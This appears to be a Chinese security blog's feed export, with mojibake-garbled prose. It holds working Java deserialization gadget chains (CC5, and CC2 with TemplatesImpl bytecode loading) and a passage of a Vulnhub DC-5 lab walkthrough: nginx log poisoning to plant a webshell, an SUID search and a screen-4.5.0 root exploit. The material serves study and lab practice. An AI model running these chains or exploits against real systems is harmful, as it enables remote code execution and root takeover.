java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);  </span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        declaredField.set(badAttributeValueExpException,tiedMapEntry);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        serialize(badAttributeValueExpException);  </span></span><br><span class="line">      unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091345852.png" alt="image-20230709134507676"></p><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091348858.png" alt="image-20230709134826810"><br>ç­‰æŠŠCCç³»åˆ—å¼„å®Œäº†å†æŠŠè¿™ä¸ªæµç¨‹å›¾å¥½å¥½å¼„å¼„ï¼Œç›¸å½“äºæ€»ç»“ä¸€éäº†</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾2</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE2/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE2/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>å’ŒCC4ä¸€æ ·ï¼ŒCommons-Collections ä¾èµ–å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h2 id="é“¾å­åˆ†æ"><a href="#é“¾å­åˆ†æ" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h2><p>CC2å…¶å®å°±æ˜¯åœ¨CC4ä¸Šä¿®æ”¹ï¼Œå®ƒæ˜¯ä¸ºäº†é¿å…<code>transform</code>æ•°ç»„çš„ä½¿ç”¨ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦é¿å…æ˜¯å› ä¸ºshiroä¸­çš„æ¼æ´ä¼šé‡å†™å¾ˆå¤šåŠ¨æ€åŠ è½½æ•°ç»„çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå¯èƒ½EXP æ— æ³•é€šè¿‡æ•°ç»„å®ç°ï¼Œå½“ç„¶æˆ‘è¿˜æ²¡è·Ÿè¿‡shiroçš„é“¾å­åˆ°æ—¶å€™å†å»å­¦ä¹ ï¼Œé‚£ä¹ˆåˆ°è¿™é‡Œåé¢çš„æµç¨‹å›¾å°±å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061951430.png" alt="image-20230706195111859"><br>å‰é¢çš„å°±æ˜¯CC4çš„ä¸œè¥¿ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯è¦æŠŠ<code>compare</code>ä¸<code>InvokerTransform</code>è¿æ¥èµ·æ¥ç„¶åå†æŠŠ<code>InvokerTransform</code>ä¸<code>TemplatesImpl</code>è¿æ¥èµ·æ¥å°±OKäº†ï¼Œé‚£ä¹ˆè¿™é‡Œå…ˆæŠŠåé¢çš„è§£å†³ç›´æ¥æŠŠCC4çš„æ‹¿è¿‡æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//åŠ¨æ€ç±»åŠ è½½å‘½ä»¤æ‰§è¡Œ  </span><br><span class="line">TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">Class tclass = templates.getClass();  </span><br><span class="line">Field nameField = tclass.getDeclaredField(&quot;_name&quot;);  </span><br><span class="line">nameField.setAccessible(true);  </span><br><span class="line">nameField.set(templates,&quot;aaa&quot;);  </span><br><span class="line">  </span><br><span class="line">Field bytecodes = tclass.getDeclaredField(&quot;_bytecodes&quot;);  </span><br><span class="line">bytecodes.setAccessible(true);  </span><br><span class="line">  </span><br><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;E://java-tools/test.class&quot;));  </span><br><span class="line">byte[][] codes = &#123;code&#125;;  </span><br><span class="line">bytecodes.set(templates,codes);</span><br></pre></td></tr></table></figure><p>ç„¶åæ„é€ <code>InvokerTransformer</code>ç±»å»è°ƒç”¨<code>TemplatesImpl.newTransformer()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è®©<code>TransformingComparator.compare()</code>å’Œ<code>InvokerTransformer</code>è¿æ¥èµ·æ¥ï¼Œå½“ç„¶è¿™é‡Œå’ŒCC4ä¸€æ ·ä¸ºäº†é¿å…<code>priorityQueue.add()</code>æå‰æ‰§è¡Œ<code>compare()</code>æ–¹æ³•ï¼Œæ‰€ä»¥ä»£ç ä¹Ÿä¸€æ ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ›å»º PriorityQueue ç±»å¯¹è±¡ ä¼ å…¥ <code>transformingComparator</code>çš„å¯¹è±¡ä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬å‘é˜Ÿåˆ—é‡Œé¢æ·»åŠ çš„å…ƒç´ æ˜¯å‰â¾¯åˆ›å»ºçš„ <code>TemplatesImpl</code>çš„å¯¹è±¡ï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯æ·»åŠ åœ¨é˜Ÿåˆ—ç¬¬ä¸€ä¸ªå…ƒç´ ä½ç½®å› ä¸ºæœ€åè°ƒç”¨ <code>PriorityQueue.compare()</code> çš„æ—¶å€™æ˜¯ä¼ å…¥é˜Ÿåˆ—ä¸­çš„ä¸¤ä¸ªå¯¹è±¡ï¼Œç„¶å <code>compare()</code> ä¸­è°ƒç”¨ <code>Transformer.transform(obj1)</code> çš„æ—¶å€™ç”¨çš„æ˜¯ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè·Ÿè¿›å»çœ‹ä¸€ä¸‹å³å¯çŸ¥é“<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061951082.png" alt="image-20230706195150985"><br>å½“ç„¶ä¸¤ä¸ªéƒ½è®¾ç½®ä¸º<code>TemplatesImpl</code>çš„å¯¹è±¡ä¹Ÿæ²¡å…³ç³»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">priorityQueue.add(templates);  </span><br><span class="line">priorityQueue.add(templates);</span><br></pre></td></tr></table></figure><p>ç„¶ååˆå’ŒCC4ä¸€æ ·äº†åå°„æ”¹å›æ¥å°±è¡Œï¼Œç„¶åæŠŠ<code>chainedTransformer</code>æ”¹ä¸º<code>invokerTransformer</code>å› ä¸ºæˆ‘ä»¬æ˜¯ç›´æ¥è¿æ¥çš„InvokerTransformç±»çš„<code>transform</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();  </span><br><span class="line"><span class="type">Field</span> <span class="variable">transformField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);  </span><br><span class="line">transformField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">transformField.set(transformingComparator, invokerTransformer);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåˆ°è¿™é‡ŒCC2ä¹Ÿå°±ç»“æŸäº†ï¼Œæœ€ç»ˆçš„expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//åŠ¨æ€ç±»åŠ è½½å‘½ä»¤æ‰§è¡Œ  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));  </span><br><span class="line">  </span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">        priorityQueue.add(templates);  </span><br><span class="line">        priorityQueue.add(templates);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);  </span><br><span class="line">        transformField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        transformField.set(transformingComparator, invokerTransformer);  </span><br><span class="line"><span class="comment">//        serialize(priorityQueue);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061952596.png" alt="image-20230706195209452"></p><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p>è¿™æ¬¡æµç¨‹å›¾è¿˜æ˜¯ç›´æ¥åœ¨å‰é¢çš„åŸºç¡€ä¸Šæ”¹çš„ï¼Œå¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061952237.png" alt="image-20230706195223181"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-5</title>
      <link href="/2023/07/Vulnhub-DC-5/"/>
      <url>/2023/07/Vulnhub-DC-5/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://download.vulnhub.com/dc/DC-5.zip">https://download.vulnhub.com/dc/DC-5.zip</a></p><h2 id="å¼€å§‹æ‰“é¶"><a href="#å¼€å§‹æ‰“é¶" class="headerlink" title="å¼€å§‹æ‰“é¶"></a>å¼€å§‹æ‰“é¶</h2><p>å¸¸è§„æ“ä½œå­˜æ´»IPæ‰«æ<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061520919.png" alt="image-20230706151759773"><br>ç«¯å£å¼€æ”¾æ‰«æ<code>nmap -A -p- 192.168.75.138</code>å¾—å…¨ç«¯å£æ‰«æä¸ç„¶åé¢é‚£ä¸ªæ‰«ä¸å‡ºæ¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521447.png" alt="image-20230706152121358"><br>é¡µé¢çš„æ¡†æ¡†æµ‹äº†ä¸€ä¸‹æ²¡å•¥ä¸œè¥¿ï¼Œåœ¨æˆ‘æ¥å›è·³è½¬çš„æ—¶å€™çœ‹åˆ°å¦‚ä¸‹ä½ç½®ä¼šå‘ç”Ÿå˜åŒ–<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521465.png" alt="image-20230706152129436"><br>çŒœæµ‹å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œdirsearchæ‰«æä¸€ä¸‹ç›®å½•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521542.png" alt="image-20230706152137505"><br>è®¿é—®footer.phpåˆ·æ–°å‘ç°å¹´ä»½å˜åŒ–ï¼Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521344.png" alt="image-20230706152148309"><br>è€Œthankyou.phpé¡µé¢åˆ·æ–°ä¹Ÿå­˜åœ¨å˜åŒ–ï¼Œç¡®è®¤è¿™é‡Œå­˜åœ¨æ–‡ä»¶åŒ…å«fuzzä¸€ä¸‹å‚æ•°æœ¬æ¥æƒ³ç”¨wfuzzæ¥fuzzå‚æ•°çš„ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€ç›´404æ— å¥ˆåªèƒ½æå‡ºæˆ‘çè—å¤šå¹´çš„å­—å…¸äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061523186.png" alt="image-20230706152313122"><br>å¾—åˆ°å‚æ•°ä¸ºfileï¼Œä»æ’ä»¶ä¸­å¾—åˆ°æœåŠ¡ä¸ºnginxé‚£ä¹ˆå¯ä»¥å°è¯•åˆ©ç”¨æ—¥å¿—å†™é©¬ï¼Œè®¿é—®æ—¥å¿—ä¸»è¦è®°å½•å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚å®¢æˆ·ç«¯å‘NginxæœåŠ¡å™¨å‘èµ·çš„æ¯ä¸€æ¬¡è¯·æ±‚éƒ½è®°å½•åœ¨è¿™é‡Œã€‚å®¢æˆ·ç«¯IPï¼Œæµè§ˆå™¨ä¿¡æ¯ï¼Œrefererï¼Œè¯·æ±‚å¤„ç†æ—¶é—´ï¼Œè¯·æ±‚URLç­‰éƒ½å¯ä»¥åœ¨è®¿é—®æ—¥å¿—ä¸­å¾—åˆ°ã€‚<br>é€šè¿‡fuzzå¾—åˆ°æ—¥å¿—è·¯å¾„å¦‚ä¸‹ï¼Œå½“ç„¶è¿™é‡Œæ˜¯é»˜è®¤çš„ç›´æ¥è®¿é—®å°±è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">/var/log/nginx/error.log</span><br></pre></td></tr></table></figure><h2 id="é€šè¿‡nginxæ—¥å¿—å†™å…¥webshell"><a href="#é€šè¿‡nginxæ—¥å¿—å†™å…¥webshell" class="headerlink" title="é€šè¿‡nginxæ—¥å¿—å†™å…¥webshell"></a>é€šè¿‡nginxæ—¥å¿—å†™å…¥webshell</h2><p>ç„¶åå°è¯•å†™å…¥ç‚¹ä¸œè¥¿<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061549253.png" alt="image-20230706152333451">å‘ç°å†™å…¥æˆåŠŸ<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061523970.png" alt="image-20230706152340900"></p><p>é‚£ä¹ˆç›´æ¥å†™é©¬è¿›å»ï¼Œè¿™é‡Œä¸€å¼€å§‹æ­»æ´»å†™ä¸ä¸Šåé¢é‡æ–°ä¸‹è½½äº†ä¸€ä¸‹é¶æœºæ‰å†™ä¸Šå¥‡å¥‡æ€ªæ€ª<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061552343.png" alt="image-20230706155159016"></p><p>è¿™æ ·å°±å†™å…¥æˆåŠŸäº†ï¼Œç„¶åå†å»åŒ…å«ä¸€ä¸‹æ—¥å¿—å³å¯çœ‹åˆ°ï¼Œä¸‹å›¾ç¬¬ä¸€ä¸ªæ˜¯æˆ‘ç›´æ¥ç”¨hackbarå‘åŒ…å†™çš„ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æ—¥å¿—ä¸Šç›´æ¥æ˜¾ç¤ºäº†é©¬ï¼Œä½†æ˜¯é‚£ä¸ªè¢«è½¬ä¹‰äº†å®æµ‹è¿ä¸ä¸Šï¼Œåé¢ä¸€ä¸ªæ˜¯æˆ‘ç”¨bpå‘åŒ…å†™çš„è™½ç„¶çœ‹ä¸åˆ°é©¬ä½†æ˜¯å®é™…ä¸Šå·²ç»å†™è¿›å»äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524113.png" alt="image-20230706152416061"><br>ç„¶åèšå‰‘è¿æ¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524932.png" alt="image-20230706152425898"><br>ä¸ºwww-dataæƒé™ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯ææƒäº†</p><h2 id="screenææƒ"><a href="#screenææƒ" class="headerlink" title="screenææƒ"></a>screenææƒ</h2><p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹å“ªäº›å‘½ä»¤å…·æœ‰suidæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524909.png" alt="image-20230706152437869"><br>æœ‰ä¸ªeximåœ¨dc-4ä¸­ä¸å°±æ˜¯ç”¨è¿™ä¸ªææƒçš„å—ä¸çŸ¥é“è¿™é‡Œå¯ä¸å¯ä»¥ï¼Œä¸è¿‡è¿™é‡Œå…ˆä¸ç®¡å¾…ä¼šå„¿å†çœ‹ï¼Œè¿™é‡Œå…ˆçœ‹<code>screen-4.5.0</code>åœ¨msfä¸Šæœä¸€ä¸‹ç›¸å…³æ¼æ´ï¼Œæ‰¾åˆ°ä¹‹åæ‰§è¡Œå¦‚ä¸‹æ“ä½œæŠŠexpæ‹·ä¸‹æ¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524427.png" alt="image-20230706152458317"><br>ç„¶åæ ¹æ®expæç¤ºå°†å¦‚ä¸‹ä»£ç å•ç‹¬ä¿å­˜ä¸º<code>libhax.c</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525991.png" alt="image-20230706152507960"><br>ç„¶ågccç¼–è¯‘å®ƒå¾—åˆ°soæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so  libhax.c</span><br></pre></td></tr></table></figure><p>ç„¶åå†å°†å¦‚ä¸‹ä»£ç ä¿å­˜ä¸º<code>rootshell.c</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525278.png"><br>ç„¶åä¹Ÿæ˜¯gccç¼–è¯‘å¾—åˆ°rootshellï¼Œè¿™é‡Œä¸€å®šè¦æ³¨æ„è‡ªå·±æ”»å‡»æœºçš„glibcçš„ç‰ˆæœ¬ä¸ç„¶åé¢ä¼šæŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 